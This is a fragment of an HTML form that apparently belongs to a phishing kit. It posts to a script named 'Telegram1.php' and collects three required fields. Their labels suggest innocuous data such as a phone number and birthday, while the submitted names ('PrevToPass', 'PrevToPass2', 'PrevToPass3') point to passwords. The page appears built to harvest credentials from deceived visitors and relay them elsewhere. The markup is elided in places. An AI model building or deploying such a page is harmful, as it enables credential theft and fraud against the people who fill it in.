...
<div class="iConWeb">
  ...
  <form action="Telegram1.php?button_location=settings&amp;button_name=help" method="POST">
...
<div class="ElementWrapper">
    ...
    <div data-form-element-key="PrevYearDays" class="FormElement FormElement_TextBox NoTopMargin PrevYearDays">
        <div class="TextBox floatingLabelContainer">
          <input type="text" name="PrevToPass" id="PrevYearDays" required="" pattern=".{5,}" placeholder=" ">
  ...
  <div data-form-element-key="PhoneNumber" class="FormElement FormElement_TextBox NoTopMargin PhoneNumber">
    <div class="TextBox floatingLabelContainer">
      <input type="text" name="PrevToPass2" id="PhoneNumber" required="" pattern=".{5,}" placeholder=" ">
   ...
   <div data-form-element-key="Birthday" class="FormElement FormElement_TextBox NoTopMargin Birthday">
        <div class="TextBox floatingLabelContainer">
          <input type="text" name="PrevToPass3" id="Birthday" required="" pattern=".{5,}" placeholder=" ">
